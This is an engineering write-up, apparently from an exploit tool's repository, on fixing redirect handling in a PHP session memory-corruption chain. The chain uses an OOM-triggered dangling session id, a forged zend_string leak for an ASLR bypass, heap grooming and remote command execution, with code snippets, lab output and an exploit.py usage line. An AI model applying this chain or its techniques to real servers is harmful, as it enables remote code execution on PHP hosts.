# Redirect support: three regressions and their fixes

Adding 3xx handling to `lib/transport.py` broke the chain three times. Each
regression looked like a different failure, and each one was mine. This is the
write-up so the next person does not repeat it.

---

## Background

Upstream treated every non-500 response as "retry". A real entry point that
redirects produced:

```txt
A1: END-cleanup send_cookie OOM
    -> HTTP 302
[!] expected 500 (OOM), retrying
```

five times, never reaching the application. So redirect following had to be
added.

The naive version:

```python
resp = _send_once(cfg, data)
if status in (301, 302, 303, 307, 308):
    current = resolve_location(current, Location)
    continue
```

That is where the trouble started.

---

## Regression 9a — cookie injection poisoned the leak

A cookie jar was added, and `_send_once` injected it into every request:

```python
if cfg.cookie:
    head += b"\r\nCookie: " + cfg.cookie.encode()
```

A1 absorbs the application's own `PHPSESSID`. From then on B1 carried that
cookie *in addition to* its own forged one.

B1's leak window **is** the cookie bytes: the forged `zend_string` length makes
`php_url_encode` read past the boundary of the session id. Extra cookie data
changes what is read.

```txt
B1: stale-id OOB read (ASLR bypass)
    leak failed: no heap pointers in leak window
```

**Fix.** Injection is opt-in:

```python
if cfg.inject_cookie and cfg.cookie:
    ...
```

`cfg.inject_cookie` is only true inside `resolve_entry()`. The resolver also
discards any `PHPSESSID` it picked up, because the chain must own its session:

```python
kept = [p for p in cfg.cookie.split(";")
        if p.strip() and not p.strip().upper().startswith("PHPSESSID=")]
cfg.cookie = "; ".join(kept) or saved_cookie
```

---

## Regression 9b — a missing `return` swallowed every response

The redirect loop ended like this:

```python
        if code in (301, 302, 303):
            body_request = (...).encode()

def send_chunked(...):        # <-- next function, no return in between
```

There was no `return resp` after the loop. Python does not care; control fell
through into the next `def`. Every chunked request returned `None`:

```txt
B1: leak failed: no Set-Cookie in leak response (0 bytes)
```

**Fix.** One line, placed with a line-anchored edit because the surrounding
whitespace made a naive string replace miss:

```python
        return resp
```

**Lesson.** A silent zero-length response after refactoring the send path is
almost always a missing `return`, not a network problem.

---

## Regression 9c — an eager probe shifted the heap

To pin the chain to the final path, the entry point was resolved before A1:

```python
resolved = resolve_entry(cfg, path, verbose=verbose)
if resolved != path:
    path = resolved
```

`resolve_entry` sends a GET. On a **single-worker prefork** target, that extra
request between recon and the first payload is enough to move the heap state
the chain depends on:

```txt
B1: stale-id OOB read (ASLR bypass)
    leak failed: no heap pointers in leak window
```

The regression was invisible on a 16-worker lab (`p2s-8426`: every attempt
worked) and only appeared on the single-worker lab (`p2s-8415`).

**Fix.** No eager probe. The hop is resolved lazily during A1 and pinned
afterwards:

```python
if hops == 1:
    cfg.pin_path = new_path
```

---

## Verified behaviour after all fixes

Direct entry point (no redirect) — regression gone:

```txt
[+] chain completed on try 1 candidate 1
[OUTPUT]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Redirecting entry point — transport works, chain does not:

```txt
[redirect] /redir.php -> /landing.php
A1 -> HTTP 500
B1: leak failed: no Set-Cookie in leak response (0 bytes)
```

---

## Why the redirect case still fails, and it is not a transport bug

A1 is posted to `/redir.php`. That script redirects, so the OOM fires in
`/landing.php`. The dangling `PS(id)` belongs to the `/landing.php` request.

Then the hop pins the remaining stages to `/landing.php` — but B1's reclaim
depends on the *freed block from A1*, which was allocated in a request whose
path was still `/redir.php`. The allocator state does not line up.

**Workaround.** Resolve the redirect yourself and point the tool at the final
path:

```bash
curl -sI https://TARGET/ | grep -i location
python3 exploit.py -t https://TARGET/landing.php --cmd 'id' --save /out/x
```

**Real fix, not implemented.** Resolve the redirect with a side channel that
does not touch the target worker (a proxy probe, a HEAD from a different
connection pool, or a cached result from `--recon-only`), then pin before A1.
Anything that sends a request through the same single worker will shift the heap
again.

---

## Test harness

`lab/www/redir.php` returns `302 -> /landing.php`; `lab/www/landing.php` calls
`session_start()`. Both labs mount the same `www/` directory, so the redirect
test works on either port.

```bash
bash lab/lab_php_versi8415.sh up
curl -sI http://127.0.0.1:8088/redir.php | head -3
```
